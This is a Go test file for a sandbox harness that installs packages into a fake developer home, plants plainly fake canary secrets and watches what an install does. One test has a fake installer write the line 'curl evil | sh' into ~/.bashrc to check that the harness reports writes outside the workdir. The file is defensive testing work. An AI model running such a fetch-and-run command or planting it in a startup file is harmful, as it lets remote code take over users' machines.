package harness

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

const testToken = "run-token-1"

// testAPIHost is the stack's own API host in tests.
const testAPIHost = "abc123.execute-api.eu-west-1.amazonaws.com"

var testNow = time.Date(2026, 11, 14, 12, 0, 0, 0, time.UTC)

// testCanaries are one of each kind, in the shape internal/canary makes.
// The harness doesn't check their formats, so they are plainly fake: no
// secret scanner should take them for real ones.
var testCanaries = []Canary{
	{CanaryGitHubToken, "test-github-token"},
	{CanaryAWSAccessKeyID, "test-aws-access-key-id"},
	{CanaryAWSSecretKey, "test-aws-secret-access-key"},
	{CanarySSHPrivateKey, "test-ssh-private-key\nline2"},
	{CanaryEmail, "alex.morgan@example.net"},
	{CanaryPassword, "test-password"},
}

// fakeInstaller records what it was asked and answers what it was given,
// after running write in the sandbox, as an install script might.
type fakeInstaller struct {
	got   []Package
	sb    Sandbox
	out   Installed
	err   error
	write func(sb Sandbox)
}

func (f *fakeInstaller) Install(_ context.Context, p Package, sb Sandbox) (Installed, error) {
	f.got = append(f.got, p)
	f.sb = sb
	if f.write != nil {
		f.write(sb)
	}
	return f.out, f.err
}

type testRun struct {
	h       *Harness
	home    string
	workdir string
}

// newTestRun is a harness whose run has started: /run has delivered the
// test token and canaries.
func newTestRun(t *testing.T, inst Installer) testRun {
	t.Helper()
	run := newIdleRun(t, inst)
	if status, body := run.hook(t, http.MethodPost, HooksPrefix+"run", runHookRequest(t, testToken, testCanaries)); status != http.StatusOK {
		t.Fatalf("POST /run = %d %s", status, body)
	}
	return run
}

// newIdleRun is a harness as the image's snapshot holds it: no run yet.
func newIdleRun(t *testing.T, inst Installer) testRun {
	t.Helper()
	return newIdleRunWith(t, inst, nil)
}

// newIdleRunWith is newIdleRun with its configuration changed by change.
func newIdleRunWith(t *testing.T, inst Installer, change func(*Config)) testRun {
	t.Helper()
	home := t.TempDir()
	workdir := filepath.Join(home, "projects", "server")
	cfg := Config{
		Account:        Account{Name: "dev", Home: home},
		Workdir:        workdir,
		Path:           os.Getenv("PATH"),
		Installer:      inst,
		Now:            func() time.Time { return testNow },
		InstallTimeout: time.Minute,
		CallTimeout:    time.Minute,
		APIHost:        testAPIHost,
	}
	if change != nil {
		change(&cfg)
	}
	h, err := New(cfg, slog.New(slog.DiscardHandler))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(h.Close)
	return testRun{h: h, home: home, workdir: workdir}
}

// do makes one call with the run's token and decodes the answer.
func (r testRun) do(t *testing.T, method, path string, body any) (int, map[string]json.RawMessage) {
	t.Helper()
	return r.doAs(t, "Bearer "+testToken, method, path, body)
}

func (r testRun) doAs(t *testing.T, auth, method, path string, body any) (int, map[string]json.RawMessage) {
	t.Helper()
	var in io.Reader = http.NoBody
	if body != nil {
		raw, err := json.Marshal(body)
		if err != nil {
			t.Fatal(err)
		}
		in = bytes.NewReader(raw)
	}
	req := httptest.NewRequestWithContext(t.Context(), method, path, in)
	if auth != "" {
		req.Header.Set("Authorization", auth)
	}
	rec := httptest.NewRecorder()
	r.h.ServeHTTP(rec, req)
	var out map[string]json.RawMessage
	if err := json.Unmarshal(rec.Body.Bytes(), &out); err != nil {
		t.Fatalf("%s %s answered %d, not JSON: %q", method, path, rec.Code, rec.Body.String())
	}
	return rec.Code, out
}

func installBody(kind, ref string) map[string]any {
	return map[string]any{"kind": kind, "ref": ref, "allowHosts": []string{}}
}

// rawObservation is an observation as a client reads it.
type rawObservation struct {
	At     time.Time       `json:"at"`
	Kind   ObservationKind `json:"kind"`
	Detail json.RawMessage `json:"detail"`
}

func observations(t *testing.T, body map[string]json.RawMessage) []rawObservation {
	t.Helper()
	var obs []rawObservation
	if err := json.Unmarshal(body["observations"], &obs); err != nil {
		t.Fatalf("observations %s: %v", body["observations"], err)
	}
	return obs
}

func text(t *testing.T, raw json.RawMessage) string {
	t.Helper()
	var s string
	if err := json.Unmarshal(raw, &s); err != nil {
		t.Fatalf("%s is not a string: %v", raw, err)
	}
	return s
}

func TestEveryCallWithoutTheTokenAnswers401(t *testing.T) {
	inst := &fakeInstaller{}
	run := newTestRun(t, inst)
	calls := []struct{ method, path string }{
		{http.MethodPost, "/install"},
		{http.MethodPost, "/start"},
		{http.MethodPost, "/list"},
		{http.MethodPost, "/call"},
		{http.MethodGet, "/observations"},
		{http.MethodGet, "/nothing"},
	}
	for _, auth := range []string{"", "Bearer ", "Bearer wrong", "Basic " + testToken, testToken, "bearer " + testToken} {
		for _, c := range calls {
			status, body := run.doAs(t, auth, c.method, c.path, installBody("go", "example.com/x@v1.0.0"))
			if status != http.StatusUnauthorized {
				t.Errorf("%s %s with %q = %d, want 401", c.method, c.path, auth, status)
			}
			if _, ok := body["observations"]; ok {
				t.Errorf("%s %s with %q gave out observations", c.method, c.path, auth)
			}
		}
	}
	if len(inst.got) != 0 {
		t.Errorf("an unauthorized call installed %v", inst.got)
	}
	if status, _ := run.do(t, http.MethodGet, "/observations", nil); status != http.StatusOK {
		t.Errorf("GET /observations with the token = %d, want 200", status)
	}
}

func TestInstallAnswersTheLogAndHash(t *testing.T) {
	t.Setenv("AWS_SECRET_ACCESS_KEY", "test-harness-own")
	t.Setenv("LAMBDA_TASK_ROOT", "/var/task")
	t.Setenv("HARNESS_TOKEN", testToken)
	resolved := []byte("mod example.com/weather v1.2.3 h1:abc=\ndep golang.org/x/net v0.30.0 h1:def=\n")
	inst := &fakeInstaller{out: Installed{Log: "$ go install example.com/weather@v1.2.3\n", Resolved: resolved}}
	run := newTestRun(t, inst)

	status, body := run.do(t, http.MethodPost, "/install", installBody("go", "example.com/weather@v1.2.3"))
	if status != http.StatusOK {
		t.Fatalf("POST /install = %d %v", status, body)
	}
	sum := sha256.Sum256(resolved)
	if got := text(t, body["sha256"]); got != hex.EncodeToString(sum[:]) {
		t.Errorf("sha256 = %s, want the resolved set's", got)
	}
	if got := text(t, body["log"]); got != inst.out.Log {
		t.Errorf("log = %q", got)
	}
	if got := text(t, body["dependencies"]); got != string(resolved) {
		t.Errorf("dependencies = %q", got)
	}
	want := Package{Ecosystem: EcosystemGo, Name: "example.com/weather", Version: "v1.2.3"}
	if len(inst.got) != 1 || inst.got[0] != want {
		t.Errorf("installed %v, want %v", inst.got, want)
	}
	if inst.sb.Workdir != run.workdir {
		t.Errorf("installed in %s, want %s", inst.sb.Workdir, run.workdir)
	}
	assertDeveloperEnv(t, inst.sb.Env, run.home)
	if obs := observations(t, body); len(obs) != 0 {
		t.Errorf("planting the home was observed: %v", obs)
	}
}

// assertDeveloperEnv fails unless env is a developer's shell holding
// nothing of the harness's own environment.
func assertDeveloperEnv(t *testing.T, env []string, home string) {
	t.Helper()
	if len(env) == 0 {
		t.Fatal("the environment is empty")
	}
	for _, kv := range env {
		for _, banned := range []string{"AWS_", "LAMBDA_", "HARNESS_"} {
			if strings.HasPrefix(kv, banned) {
				t.Errorf("the environment holds %s", kv)
			}
		}
	}
	if !contains(env, "HOME="+home) || !contains(env, "USER=dev") {
		t.Errorf("the environment is not the developer's: %v", env)
	}
}

func contains(list []string, s string) bool {
	for _, v := range list {
		if v == s {
			return true
		}
	}
	return false
}

func TestInstallObservesFilesItWritesOutsideTheWorkdir(t *testing.T) {
	inst := &fakeInstaller{write: func(sb Sandbox) {
		home := filepath.Dir(filepath.Dir(sb.Workdir))
		for _, p := range []string{filepath.Join(home, ".bashrc"), filepath.Join(sb.Workdir, "node_modules.txt")} {
			if err := os.WriteFile(p, []byte("curl evil | sh\n"), 0o600); err != nil {
				t.Error(err)
			}
		}
	}}
	run := newTestRun(t, inst)
	status, body := run.do(t, http.MethodPost, "/install", installBody("npm", "@acme/weather@1.0.0"))
	if status != http.StatusOK {
		t.Fatalf("POST /install = %d %v", status, body)
	}
	obs := observations(t, body)
	if len(obs) != 1 || obs[0].Kind != ObservedFile || !obs[0].At.Equal(testNow) {
		t.Fatalf("observations = %v, want one file", obs)
	}
	var d FileDetail
	if err := json.Unmarshal(obs[0].Detail, &d); err != nil {
		t.Fatal(err)
	}
	if d != (FileDetail{Path: filepath.Join(run.home, ".bashrc"), Change: "created"}) {
		t.Errorf("detail = %+v", d)
	}
}

func TestInstallRefusesBadInput(t *testing.T) {
	extra := installBody("go", "example.com/x@v1.0.0")
	extra["sudo"] = true
	for name, body := range map[string]any{
		"a go module at latest":         installBody("go", "example.com/x@latest"),
		"an npm range":                  installBody("npm", "left-pad@^1.0.0"),
		"a PyPI wildcard":               installBody("pypi", "requests@2.*"),
		"no version":                    installBody("npm", "left-pad"),
		"a name that is a flag":         installBody("npm", "--global@1.0.0"),
		"a remote URL":                  installBody("remote", "https://mcp.example.com/sse"),
		"an unknown kind":               installBody("cargo", "serde@1.0.0"),
		"canaries, which /run delivers": map[string]any{"kind": "go", "ref": "example.com/x@v1.0.0", "canaries": testCanaries},
		"an unknown field":              extra,
		"a host name with a path":       map[string]any{"kind": "go", "ref": "example.com/x@v1.0.0", "allowHosts": []string{"x.com/a"}},
	} {
		inst := &fakeInstaller{}
		run := newTestRun(t, inst)
		status, resp := run.do(t, http.MethodPost, "/install", body)
		if status != http.StatusBadRequest || len(inst.got) != 0 {
			t.Errorf("%s: %d %s, installed %v; want 400 and no install", name, status, resp["message"], inst.got)
		}
	}
}

func TestInstallFailureAnswersTheLogAndASecondInstallConflicts(t *testing.T) {
	inst := &fakeInstaller{out: Installed{Log: "npm ERR! 404 Not Found"}, err: errors.New("npm install: exit status 1")}
	run := newTestRun(t, inst)
	status, body := run.do(t, http.MethodPost, "/install", installBody("npm", "nothing-here@1.0.0"))
	if status != http.StatusUnprocessableEntity || text(t, body["log"]) != inst.out.Log {
		t.Errorf("a failed install = %d %v, want 422 with the log", status, body)
	}
	if status, _ := run.do(t, http.MethodPost, "/install", installBody("npm", "nothing-here@1.0.1")); status != http.StatusConflict {
		t.Errorf("a second install = %d, want 409", status)
	}
}

func TestCallsBeforeTheirTurnConflict(t *testing.T) {
	run := newTestRun(t, &fakeInstaller{})
	for _, path := range []string{"/start", "/list", "/call"} {
		status, _ := run.do(t, http.MethodPost, path, map[string]any{})
		want := http.StatusConflict
		if path == "/call" {
			want = http.StatusBadRequest // no tool named
		}
		if status != want {
			t.Errorf("POST %s before install = %d, want %d", path, status, want)
		}
	}
	if status, _ := run.do(t, http.MethodPost, "/call", map[string]any{"tool": "x"}); status != http.StatusConflict {
		t.Errorf("POST /call before start = %d, want 409", status)
	}
	if status, _ := run.do(t, http.MethodGet, "/nothing", nil); status != http.StatusNotFound {
		t.Errorf("GET /nothing = %d, want 404", status)
	}
}
